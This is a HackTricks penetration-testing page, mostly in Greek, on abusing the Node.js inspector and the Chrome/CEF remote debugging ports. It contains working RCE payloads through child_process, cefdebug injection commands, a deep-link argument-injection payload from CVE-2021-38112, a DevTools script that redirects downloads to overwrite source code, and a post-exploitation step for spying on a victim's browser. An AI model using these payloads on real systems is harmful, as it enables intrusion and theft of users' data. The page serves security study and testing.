# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

[Από την τεκμηρίωση](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Όταν εκκινείται με το switch `--inspect`, μια διεργασία Node.js ακούει για έναν debugging client. Από **προεπιλογή**, ακούει στη διεύθυνση host και port **`127.0.0.1:9229`**. Σε κάθε διεργασία εκχωρείται επίσης ένα **μοναδικό** **UUID**.<sup>[[4]](#references)</sup>

Οι inspector clients πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση host, το port και το UUID για να συνδεθούν. Ένα πλήρες URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Εφόσον ο **debugger έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας malicious actor που μπορεί να συνδεθεί σε αυτό το port ενδέχεται να είναι σε θέση να εκτελέσει arbitrary code εκ μέρους της διεργασίας Node.js (**potential privilege escalation**).

Υπάρχουν διάφοροι τρόποι εκκίνησης ενός inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Όταν εκκινήσετε μια υπό επιθεώρηση διεργασία, θα εμφανιστεί κάτι σαν το εξής:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**), όπως, χρειάζεται να χρησιμοποιούν την παράμετρο: `--remote-debugging-port=9222` για να ανοίξουν τον **debugger** (οι προστασίες από **SSRF** παραμένουν πολύ παρόμοιες). Ωστόσο, **αντί** να παρέχουν μια συνεδρία **debug** του **NodeJS**, επικοινωνούν με τον browser χρησιμοποιώντας το [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), μια διεπαφή για τον έλεγχο του browser, αλλά δεν υπάρχει άμεσο **RCE**.<sup>[[5]](#references)</sup>

Όταν ξεκινάτε έναν browser με ενεργοποιημένο το **debug**, θα εμφανιστεί κάτι σαν το εξής:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets και same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε έναν web-browser μπορούν να πραγματοποιούν WebSocket και HTTP requests σύμφωνα με το μοντέλο ασφάλειας του browser. Απαιτείται μια **αρχική σύνδεση HTTP** για την **απόκτηση ενός μοναδικού debugger session id**. Η **same-origin-policy** **εμποδίζει** τους ιστότοπους να πραγματοποιήσουν **αυτή τη σύνδεση HTTP**. Για πρόσθετη ασφάλεια έναντι [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι τα **'Host' headers** της σύνδεσης καθορίζουν είτε μια **IP address** είτε ακριβώς το **`localhost`** ή το **`localhost6`**.<sup>[[12]](#references)</sup>

> [!TIP]
> Αυτά τα **μέτρα ασφάλειας εμποδίζουν την εκμετάλλευση του inspector** για την εκτέλεση κώδικα **μόνο με την αποστολή ενός HTTP request** (κάτι που θα μπορούσε να γίνει με την εκμετάλλευση ενός SSRF vuln).

### Εκκίνηση του inspector σε running processes

Μπορείτε να στείλετε το **signal SIGUSR1** σε μια running nodejs process, ώστε να την κάνετε να **εκκινήσει τον inspector** στην default port. Ωστόσο, σημειώστε ότι πρέπει να διαθέτετε επαρκή privileges, επομένως αυτό μπορεί να σας προσφέρει **privileged access σε πληροφορίες μέσα στη process**, αλλά όχι άμεσο privilege escalation.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Αυτό είναι χρήσιμο σε containers, επειδή το **τερματισμός της διεργασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν αποτελεί επιλογή**, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.

### Σύνδεση με inspector/debugger

Για σύνδεση σε έναν **Chromium-based browser**, μπορείτε να προσπελάσετε τα URLs `chrome://inspect` ή `edge://inspect` για το Chrome ή το Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, θα πρέπει να διασφαλιστεί ότι ο **host και η θύρα-στόχος** εμφανίζονται σωστά. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):

![Μετά την εμφάνιση ενός URL για πρόσβαση στον debugger, π.χ. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Σύνδεση με inspector/debugger: Για σύνδεση σε έναν Chromium-based browser,...](<../../images/image (674).png>)

Χρησιμοποιώντας τη **γραμμή εντολών**, μπορείτε να συνδεθείτε σε έναν debugger/inspector με:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει να **εντοπίζετε inspectors** που εκτελούνται τοπικά και να **εγχέετε κώδικα** σε αυτούς.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Σημειώστε ότι τα **NodeJS RCE exploits δεν θα λειτουργήσουν** αν συνδεθείτε σε έναν browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό).

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Αν ήρθατε εδώ για να δείτε πώς να αποκτήσετε [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Μερικοί συνηθισμένοι τρόποι απόκτησης **RCE** όταν μπορείτε να **connect** σε έναν Node **inspector** είναι η χρήση κάποιου τρόπου όπως ο παρακάτω (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
Σε αυτή την ενότητα θα παραθέσω απλώς ενδιαφέροντα πράγματα που έχω βρει να χρησιμοποιούν άτομα για να εκμεταλλευτούν αυτό το protocol.

### Parameter Injection via Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) η Rhino Security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF **registered a custom UR**I στο σύστημα (workspaces://index.html), η οποία λάμβανε ολόκληρο το URI και στη συνέχεια **launched the CEF based applicatio**n με μια διαμόρφωση που κατασκευαζόταν εν μέρει από αυτό το URI.<sup>[[8]](#references)</sup>

Ανακαλύφθηκε ότι οι παράμετροι του URI γίνονταν URL decoded και χρησιμοποιούνταν για την εκκίνηση της βασικής εφαρμογής CEF, επιτρέποντας σε έναν χρήστη να κάνει **inject** το flag **`--gpu-launcher`** στη **command line** και να εκτελέσει αυθαίρετες ενέργειες.

Έτσι, ένα payload όπως το παρακάτω:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Θα εκτελέσει ένα calc.exe.

### Overwrite Files

Αλλάξτε τον φάκελο όπου **θα αποθηκεύονται τα ληφθέντα αρχεία** και κατεβάστε ένα αρχείο για να **αντικαταστήσετε** τον συχνά χρησιμοποιούμενο **πηγαίο κώδικα** της εφαρμογής με τον **κακόβουλο κώδικά** σας.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE και exfiltration

Σύμφωνα με αυτό το post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) είναι δυνατό να αποκτήσετε RCE και να κάνετε exfiltration εσωτερικών σελίδων από το theriver.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

Σε ένα πραγματικό περιβάλλον και **μετά το compromising** ενός user PC που χρησιμοποιεί browser βασισμένο σε Chrome/Chromium, θα μπορούσατε να εκκινήσετε μια διεργασία Chrome με το **debugging ενεργοποιημένο και να κάνετε port-forward τη θύρα debugging**, ώστε να έχετε πρόσβαση σε αυτή. Με αυτόν τον τρόπο θα μπορείτε να **επιθεωρείτε ό,τι κάνει το θύμα με το Chrome και να κλέβετε ευαίσθητες πληροφορίες**.<sup>[[7]](#references)</sup>

Ο stealth τρόπος είναι να **τερματίσετε κάθε διεργασία Chrome** και στη συνέχεια να καλέσετε κάτι όπως
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Αναφορές

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution μέσω Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
